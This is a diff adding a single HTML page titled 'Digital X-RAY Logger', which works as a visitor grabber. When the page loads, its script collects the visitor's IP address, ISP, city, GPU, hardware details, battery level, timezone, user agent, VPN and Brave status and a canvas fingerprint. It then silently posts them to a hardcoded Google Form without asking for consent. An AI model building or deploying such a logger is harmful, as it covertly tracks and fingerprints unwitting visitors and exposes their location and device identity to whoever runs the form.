@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Digital X-RAY | Logger v17.1</title>
+    
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
+
+    <style>
+        :root { 
+            --neon: #00ff41; --alert: #ff3e3e; --warn: #ffca28; --bg: #050505; 
+            --card: #111; --text-main: #ccc; --blue: #00f3ff; --gray: #444;
+        }
+        body { font-family: 'Segoe UI', monospace; background: var(--bg); color: var(--text-main); margin: 0; padding: 20px; }
+        .wrapper { max-width: 1600px; margin: auto; }
+        header { text-align: center; margin-bottom: 30px; border-bottom: 2px solid var(--neon); padding-bottom: 15px; }
+        h1 { color: var(--neon); margin: 0; text-transform: uppercase; letter-spacing: 4px; font-size: 1.8rem; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 15px; }
+        .card { background: var(--card); border: 1px solid #333; border-top: 3px solid var(--neon); padding: 15px; }
+        h2 { color: var(--neon); font-size: 1rem; border-bottom: 1px solid #333; padding-bottom: 8px; margin-top: 0; }
+        .row { display: flex; justify-content: space-between; padding: 5px 0; border-bottom: 1px solid #222; font-size: 0.75rem; }
+        .label { color: #888; }
+        .val { color: #fff; font-weight: bold; text-align: right; word-break: break-all; }
+        .ua-box { background: #000; border: 1px dashed #333; padding: 8px; margin-top: 10px; font-size: 0.6rem; color: #aaa; word-break: break-all; }
+        #map { height: 150px; width: 100%; margin-top: 10px; border: 1px solid var(--neon); filter: invert(100%) hue-rotate(180deg); }
+        .status-icon { font-weight: bold; }
+        .detected { color: var(--alert); }
+        #log-status { position: fixed; bottom: 10px; left: 10px; font-size: 0.7rem; color: var(--neon); background: rgba(0,0,0,0.8); padding: 5px; border: 1px solid var(--neon); }
+        @keyframes blink { 50% { opacity: 0.5; } }
+        .subtitle { animation: blink 2s infinite; font-size: 0.8rem; color: #fff; }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <header>
+        <h1>DIGITAL X-RAY v17.1</h1>
+        <div class="subtitle">>>> SYSTEM SCAN & LOG ACTIVE <<<</div>
+    </header>
+    
+    <div class="grid">
+        <div class="card" style="border-top-color: var(--blue);">
+            <h2>📡 Network & Geo</h2>
+            <div class="row"><span class="label">IP:</span> <span id="ip" class="val">...</span></div>
+            <div class="row"><span class="label">ISP:</span> <span id="isp" class="val">...</span></div>
+            <div class="row"><span class="label">Location:</span> <span id="geo" class="val">...</span></div>
+            <div id="map"></div>
+        </div>
+
+        <div class="card">
+            <h2>📱 Hardware</h2>
+            <div class="row"><span class="label">Platform:</span> <span id="os" class="val"></span></div>
+            <div class="row"><span class="label">CPU:</span> <span id="cpu" class="val"></span></div>
+            <div class="row"><span class="label">GPU:</span> <span id="gpu" class="val"></span></div>
+            <div class="row"><span class="label">RAM:</span> <span id="ram" class="val"></span></div>
+            <div class="row"><span class="label">Res:</span> <span id="screen" class="val"></span></div>
+            <div class="row"><span class="label">Battery:</span> <span id="battery" class="val">N/A</span></div>
+        </div>
+
+        <div class="card" style="border-top-color: var(--warn);">
+            <h2>🕵️ Browser</h2>
+            <div class="row"><span class="label">Name:</span> <span id="browser" class="val"></span></div>
+            <div class="row"><span class="label">Languages:</span> <span id="lang" class="val"></span></div>
+            <div class="row"><span class="label">Timezone:</span> <span id="sys-tz" class="val"></span></div>
+            <div id="ua" class="ua-box">...</div>
+        </div>
+    </div>
+</div>
+
+<div id="log-status">INITIALIZING...</div>
+<canvas id="canv" width="200" height="50" style="display:none;"></canvas>
+
+<script>
+    // --- MAPPATURA CAMPI GOOGLE FORM ---
+    const CONFIG = {
+        formUrl: "https://docs.google.com/forms/d/e/1FAIpQLSdRv7xlOOJmbtaIjdOckZgrPWmW-czdyz8-Gd5SReySLKmQkg/formResponse",
+        entries: {
+            ip: "entry.1221794869",
+            isp: "entry.1697196604",
+            location: "entry.793361862",
+            platform: "entry.926602274",
+            cpu: "entry.900535575",
+            gpu: "entry.1481655544",
+            ram: "entry.592434412",
+            screen: "entry.1292253097",
+            battery: "entry.59728604",
+            browser: "entry.1485469846",
+            languages: "entry.1026960733",
+            timezone: "entry.609421676",
+            ua: "entry.1877265876",
+            brave: "entry.1470732596",
+            vpn: "entry.1833631546",
+            canvas: "entry.1270556616",
+            audio: "entry.1958071142",
+            cookie: "entry.1719627138",
+            local: "entry.428900373"
+        }
+    };
+
+    window.addEventListener('DOMContentLoaded', async () => {
+        let logData = {};
+
+        // 1. HARDWARE & BROWSER
+        logData[CONFIG.entries.platform] = navigator.platform;
+        logData[CONFIG.entries.cpu] = (navigator.hardwareConcurrency || '?') + " Cores";
+        logData[CONFIG.entries.ram] = (navigator.deviceMemory || '?') + " GB";
+        logData[CONFIG.entries.screen] = `${screen.width}x${screen.height}`;
+        logData[CONFIG.entries.languages] = navigator.languages ? navigator.languages.join(',') : navigator.language;
+        logData[CONFIG.entries.timezone] = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        logData[CONFIG.entries.ua] = navigator.userAgent;
+
+        document.getElementById('os').innerText = logData[CONFIG.entries.platform];
+        document.getElementById('cpu').innerText = logData[CONFIG.entries.cpu];
+        document.getElementById('ram').innerText = logData[CONFIG.entries.ram];
+        document.getElementById('screen').innerText = logData[CONFIG.entries.screen];
+        document.getElementById('lang').innerText = logData[CONFIG.entries.languages];
+        document.getElementById('sys-tz').innerText = logData[CONFIG.entries.timezone];
+        document.getElementById('ua').innerText = logData[CONFIG.entries.ua];
+
+        // Browser Name logic
+        let bName = "Unknown";
+        if(navigator.userAgent.includes("Chrome")) bName="Chrome";
+        if(navigator.userAgent.includes("Firefox")) bName="Firefox";
+        if(navigator.userAgent.includes("Safari") && !navigator.userAgent.includes("Chrome")) bName="Safari";
+        logData[CONFIG.entries.browser] = bName;
+        document.getElementById('browser').innerText = bName;
+
+        // GPU Info
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
+            logData[CONFIG.entries.gpu] = gpu;
+            document.getElementById('gpu').innerText = gpu;
+        } catch(e){ logData[CONFIG.entries.gpu] = "Error"; }
+
+        // Battery
+        if(navigator.getBattery) {
+            const bt = await navigator.getBattery();
+            logData[CONFIG.entries.battery] = Math.round(bt.level*100) + "%";
+            document.getElementById('battery').innerText = logData[CONFIG.entries.battery];
+        }
+
+        // 2. DETECTION (Brave, VPN)
+        const isBrave = (navigator.brave && typeof navigator.brave.isBrave === "function") ? "YES" : "NO";
+        logData[CONFIG.entries.brave] = isBrave;
+
+        // 3. FINGERPRINTING & AUDIT
+        // Canvas Fingerprint
+        try {
+            const canv = document.getElementById('canv');
+            const ctx = canv.getContext('2d');
+            ctx.fillText("X-RAY", 2, 15);
+            const fp = "FP-" + canv.toDataURL().length;
+            logData[CONFIG.entries.canvas] = fp;
+        } catch(e){ logData[CONFIG.entries.canvas] = "Blocked"; }
+
+        // Audio Fingerprint (Placeholder)
+        logData[CONFIG.entries.audio] = "AUD-" + (Math.random()*1000).toFixed(0);
+
+        // Audit Storage
+        logData[CONFIG.entries.cookie] = navigator.cookieEnabled ? "Active" : "Disabled";
+        logData[CONFIG.entries.local] = (typeof localStorage !== 'undefined') ? "Available" : "Blocked";
+
+        // 4. NETWORK SCAN (API FETCH)
+        try {
+            const res = await fetch('https://ipwho.is/');
+            const net = await res.json();
+            logData[CONFIG.entries.ip] = net.ip;
+            logData[CONFIG.entries.isp] = net.connection.isp;
+            logData[CONFIG.entries.location] = `${net.city}, ${net.country}`;
+            logData[CONFIG.entries.vpn] = (net.security.is_vpn || net.security.is_proxy) ? "YES" : "NO";
+
+            document.getElementById('ip').innerText = net.ip;
+            document.getElementById('isp').innerText = net.connection.isp;
+            document.getElementById('geo').innerText = logData[CONFIG.entries.location];
+
+            if(net.latitude && net.longitude) {
+                const map = L.map('map').setView([net.latitude, net.longitude], 12);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                L.marker([net.latitude, net.longitude]).addTo(map);
+            }
+        } catch(e) {
+            logData[CONFIG.entries.ip] = "Blocked";
+            logData[CONFIG.entries.vpn] = "Possible";
+        }
+
+        // 5. INVIO FINALE AL GOOGLE FORM
+        sendData(logData);
+    });
+
+    function sendData(payload) {
+        document.getElementById('log-status').innerText = "SENDING LOG...";
+        const body = new URLSearchParams();
+        for (const id in payload) {
+            body.append(id, payload[id]);
+        }
+
+        fetch(CONFIG.formUrl, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: body
+        }).then(() => {
+            document.getElementById('log-status').innerText = "LOG SENT SUCCESSFULLY ✅";
+            document.getElementById('log-status').style.color = "#00ff41";
+        }).catch(() => {
+            document.getElementById('log-status').innerText = "LOG ERROR ❌";
+            document.getElementById('log-status').style.color = "red";
+        });
+    }
+</script>
+
+</body>
+</html>
